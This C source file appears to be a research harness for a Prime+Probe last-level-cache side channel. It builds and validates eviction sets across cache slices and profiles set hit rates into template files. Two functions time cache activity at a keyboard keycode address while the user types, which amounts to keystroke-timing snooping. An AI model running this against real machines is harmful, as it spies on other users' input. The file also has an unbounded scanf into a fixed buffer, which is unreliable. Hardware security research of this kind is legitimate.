#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/eviction.h"
#include "../lib/l3pp.h"
#include "../lib/utils.h"

#define TRIALS 1000

void *mapping_start;
EvictionSet **es_list;
unsigned int core_id = 0;
FILE *file;

void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
  fclose(file);
  free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}
void handle_sigint(int sig) {
  safe_print("SIGINT received, cleanup process initiated\n");
  cleanup(es_list, mapping_start, file);
  exit(1);
}

void test_eviction_set(void) {
  uint8_t victim = 0x37;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = threshold_from_flush(&victim);
  if (!get_minimal_set(&victim, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  // Bring the victim into the cache
  uint8_t var2 = victim ^ 0xF7;

  // Access eviction set
  NumList *timings = new_num_list(TRIALS);
  evict_and_time(cl_set, &victim, timings, true);

  // Report median and mean times
  printf("Timings after accessing eviction set:\n");
  print_stats(timings);

  int evictions = 0;

  for (int i = 0; i < TRIALS; i++) {
    if (timings->nums[i] > threshold) {
      evictions++;
    }
  }

  printf("Successfully evicted %u/%u trials.\n", evictions, TRIALS);

  deep_free_cl_set(cl_set);
  free_num_list(timings);
}

void init_mapping() {
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }
}

void test_eviction_and_pp(void) {
  uint8_t *target = malloc(sizeof(uint8_t *));
  printf("target: %p\n", target);
  uintptr_t pa = pointer_to_pa(target);

  // map 64 2 MB pages to ge 256 candidate lines
  init_mapping(mapping_start);

  printf("memory mapped: %p\n", mapping_start);

  int threshold = threshold_from_flush(target);

  CacheLineSet *cl_set;
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("unable to obtain eviction set\n");
  }

  for (int i = 0; i < cl_set->size; i++) {
    printf("%p\n", cl_set->cache_lines[i]);
  }

  EvictionSet *es = new_eviction_set(cl_set);
  uint64_t time = evict_and_time_once(es, target);
  printf("threshold: %d, evict_time: %ld\n", threshold, time);

  sleep(1);

  access_set(es);
  volatile uint8_t tmp = *target;
  int list[16];
  probe(es, threshold);

  sleep(1);
  access_set(es);
  probe(es, threshold);

  free(target);
  deep_free_es(es);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}

void test_find_all_eviction_sets(int set) {
  printf("set: %d\n", set);

  es_list = get_all_slices_eviction_sets(mapping_start, set);

  for (int i = 0; i < 4; i++) {
    printf("Eviction Set %d: \n", i);
    print_eviction_set(es_list[i]->cache_lines);
  }
}

int get_evset_index(int slice) {
  int ret = -1;
  for (int i = 0; i < 4; i++) {
    CacheLine *iter = es_list[i]->head;
    if (slice == get_i7_2600_slice(pointer_to_pa((void *)iter))) {
      ret = i;
    }
  }
  return ret;
}

uint64_t *profile_slices(int set) {
  test_find_all_eviction_sets(set);

  sleep(5);
  int slice_hit_count[4];
  uint8_t hit_times[1024 * 1024];
  uint64_t timestamps[64 * 64];
  char filename[20];

  uint64_t *size = malloc(4 * sizeof(uint64_t));
  int threshold = threshold_from_flush((void *)es_list[0]->head);
  uint64_t start_time = __rdtscp(&core_id);
  flush_timestamps(&start_time, sizeof(uint64_t), filename);
  for (int i = 0; i < 4; i++) {
    int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
    printf("testing slice index: %d\n", slice);
    size[slice] = prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, hit_times,
                              1024 * 1024, timestamps, threshold);
    print_probe_result(hit_times, 1024 * 1024, 64, 64);
    sprintf(filename, "output%d.bin", slice);
    flush_timestamps(timestamps, size[slice], filename);
  }

  return size;
}

uint64_t measure_keystroke(int threshold) {
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
  int eslist_index = get_evset_index(slice);
  uint8_t probemap[1024 * 1024];
  uint64_t keystrokes[64 * 64];

  uint64_t num_keystrokes = 0;
  uint64_t start_time = __rdtscp(&core_id);
  flush_timestamps(&start_time, 1, "pp_keystrokes.bin");
  printf("please start typing\n");
  for (int i = 0; i < 10; i++) {
    // takes around 1s to fill up 1 MB buffer
    uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
                                probemap, 1024 * 1024, keystrokes, threshold);
    flush_timestamps(keystrokes, size, "pp_keystrokes.bin");
    num_keystrokes += size;
  }
  printf("\nnum_keystrokes: %lu\n", num_keystrokes);
  return start_time;
}

void measure_keystroke_without_slice(int threshold) {
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  uint8_t probemap[4][1024 * 1024];
  uint64_t keystrokes[4][64 * 64];
  uint64_t total_strokes[4];

  char filename[20];
  uint64_t start_time = __rdtscp(&core_id);
  for (int i = 0; i < 4; i++) {
    total_strokes[i] = 0;
    sprintf(filename, "pp_keystrokes_%d.bin", i);
    flush_timestamps(&start_time, 1, filename);
  }

  printf("please start typing\n");
  for (int i = 0; i < 3; i++) {
    uint64_t *num_strokes = prime_probe_many_sets(
        es_list, EVERGLADES_NUM_SLICES, EVERGLADES_ASSOCIATIVITY, 1024 * 1024,
        probemap, 64 * 64, keystrokes, threshold);
    for (int j = 0; j < 4; j++) {
      sprintf(filename, "pp_keystrokes_%d.bin", j);
      flush_timestamps(keystrokes[j], num_strokes[j], filename);
      total_strokes[j] += num_strokes[j];
    }
    free(num_strokes);
  }
  for (int i = 0; i < 4; i++) {
    printf("%lu\n", total_strokes[i]);
  }
}

void print_duration(uint64_t cycles) {
  uint64_t ms = cycles / 3000000;

  uint64_t seconds = ms / 1000;
  ms %= 1000;

  uint64_t minutes = seconds / 60;
  seconds %= 60;

  uint64_t hours = minutes / 60;
  minutes %= 60;

  printf("The operation takes %lu hours %lu minutes %lu seconds %lu "
         "milliseconds\n",
         hours, minutes, seconds, ms);
}

int main() {
  signal(SIGINT, handle_sigint);
  init_mapping();
  int threshold = threshold_from_flush(mapping_start);
  EvictionSet **all_evsets[ARCHES_SETS_PER_SLICE];

  uint64_t find_evset_start_time = __rdtscp(&core_id);
  int TEST_NUM_SETS = 10;
  for (int i = 0; i < ARCHES_SETS_PER_SLICE; i++) {
    all_evsets[i] =
        get_evsets_all_slices_hugepages(mapping_start, 96, i, threshold);
  }
  _mm_lfence();
  _mm_mfence();
  uint64_t duration = __rdtscp(&core_id) - find_evset_start_time;
  print_duration(duration);

  int NUM_MEASUREMENTS = 16384, NUM_TRIALS = 100;

  while (1) {
    char filename[128];
    printf("Enter filename to store the template (add .bin at the end): ");
    scanf("%s", filename);
    printf("\n");

    uint64_t profiling_start = __rdtscp(&core_id);
    double template[ARCHES_SETS_PER_SLICE * ARCHES_NUM_SLICES];
    int invalid_count = 0;
    for (int i = 0; i < ARCHES_SETS_PER_SLICE; i++) {
      CacheLineSet *victims = hugepage_inflate(mapping_start, 16, i);
      for (int j = 0; j < ARCHES_NUM_SLICES; j++) {
        double rates[NUM_TRIALS];

        // check if it is successfully found a set
        if (all_evsets[i][j] == NULL) {
          printf("set: %d, slice: %d --- no sets found\n", i, j);
          template[i * ARCHES_NUM_SLICES + j] = -1;
          invalid_count++;
          continue;
        }

        /* compute the actual length of the eviction set */
        int length = 0;
        CacheLine *iter = all_evsets[i][j]->head;
        while (iter->previous != NULL)
          iter = iter->previous;
        while (iter != NULL) {
          length++;
          iter = iter->next;
        }

        if (length != ARCHES_ASSOCIATIVITY) {
          printf("set: %d, slice: %d, length: %d --- invalid length\n", i, j,
                 length);
          template[i * ARCHES_NUM_SLICES + j] = -2;
          invalid_count++;
          continue;
        }

        /* check if the eviction set can evict the victim */
        bool can_evict = false;

        for (int v = 0; v < victims->size && !can_evict; v++) {
          if (evict_and_time_once(all_evsets[i][j],
                                  (uint8_t *)victims->cache_lines[v]) >
              threshold) {
            can_evict = true;
          }
        }

        if (!can_evict) {
          printf("set: %d, slice: %d, length: %d --- cannot evict\n", i, j,
                 length);
          template[i * ARCHES_NUM_SLICES + j] = -3;
          invalid_count++;
          continue;
        }

        /* only profile if it satisfy all eviction set checks */
        for (int t = 0; t < NUM_TRIALS; t++) {
          access_set(all_evsets[i][j]);
          int hit_count = 0;
          for (int k = 0; k < NUM_MEASUREMENTS; k++) {
            hit_count += probe(all_evsets[i][j], threshold);
          }
          rates[t] = (double)(hit_count) / NUM_MEASUREMENTS;
        }

        double sum = 0;
        for (int t = 0; t < NUM_TRIALS; t++) {
          sum += rates[t];
        }

        template[i * ARCHES_NUM_SLICES + j] = sum / NUM_TRIALS;

        printf("set: %d, slice: %d, length: %d --- rate: %.15lf\n", i, j,
               length, template[i * ARCHES_NUM_SLICES + j]);
      }
    }

    uint64_t profiling_end = __rdtscp(&core_id);

    printf("Successfully profile %d sets\n", 8192 - invalid_count);
    print_duration(profiling_end - profiling_start);

    FILE *outFile = fopen(filename, "wb");
    fwrite(template, sizeof(double), ARCHES_SETS_PER_SLICE * ARCHES_NUM_SLICES,
           outFile);
    fclose(outFile);
  }
  // TODO: address potential memory leak issues
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
  return 0;
}
